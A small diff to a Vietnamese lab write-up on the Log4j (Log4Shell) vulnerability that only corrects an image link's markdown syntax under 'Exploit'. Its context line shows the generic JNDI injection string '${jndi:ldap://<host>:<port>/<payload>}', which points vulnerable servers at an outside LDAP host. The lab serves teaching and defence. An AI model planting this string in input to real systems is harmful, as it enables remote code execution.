@@ -70,7 +70,7 @@ ${jndi:ldap://<host>:<port>/<payload>}
 
 ### Exploit 
 Trạng thái không sử dụng thiết bị IPS/IDS
-![noIPSIDS]{https://github.com/thotrangyeuduoi/template/blob/master/example_attack/ima/log4jlab.drawio.png}
+![noIPSIDS](https://github.com/thotrangyeuduoi/template/blob/master/example_attack/ima/log4jlab.drawio.png)
 
 ### Biện pháp phòng ngừa
 
